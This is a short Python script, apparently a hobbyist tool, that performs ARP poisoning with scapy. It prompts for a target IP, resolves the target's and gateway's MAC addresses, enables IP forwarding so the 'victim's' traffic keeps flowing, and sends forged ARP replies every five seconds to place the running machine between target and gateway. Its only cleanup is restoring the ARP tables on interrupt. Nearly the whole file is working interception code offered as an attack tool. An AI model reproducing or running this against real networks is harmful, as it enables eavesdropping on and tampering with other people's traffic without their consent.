import time, scapy, threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

def attack_start():
    target_IP = input ("Input target IP address: ")

    target_mac = get_mac(target_IP)

    print(target_mac)

    gateway_ip = get_gateway()

    gateway_mac = get_mac(gateway_ip)

    print(gateway_mac)
    arp_poison(target_IP, gateway_ip, target_mac, gateway_mac)



def arp_poison(target_IP, gateway_ip, target_mac, gateway_mac):
    packet_forward()
    print("Starting ARP Poisoning")
    try:
        while 1:
            send(ARP(op = 2, pdst=target_IP, psrc=gateway_ip, hwdst = target_mac))
            send(ARP(op = 2, pdst=gateway_ip, psrc=target_IP, hwdst = gateway_mac))
            time.sleep(5)
    except KeyboardInterrupt:
        restore_session(target_IP, gateway_ip, target_mac, gateway_mac)
        print("Stopping")

#Get MAC address of victim's machine
def get_mac(target_IP):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP (pdst=target_IP), timeout=2, retry = 10)
    for sent, rcv in ans:
        return rcv.hwsrc

#Enable packet forwarding so victim's traffic will continue to travel
def packet_forward():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#Get gateway IP address
def get_gateway():
    gateway_ip = conf.route.route("0.0.0.0")[2]
    return gateway_ip


def restore_session(target_IP, gateway_ip, target_mac, gateway_mac):
    send(ARP(op = 2, pdst=gateway_ip, psrc=target_IP, hwsrc = target_mac))
    send(ARP(op = 2, pdst=target_IP, psrc=gateway_ip, hwsrc = gateway_mac))

















#main()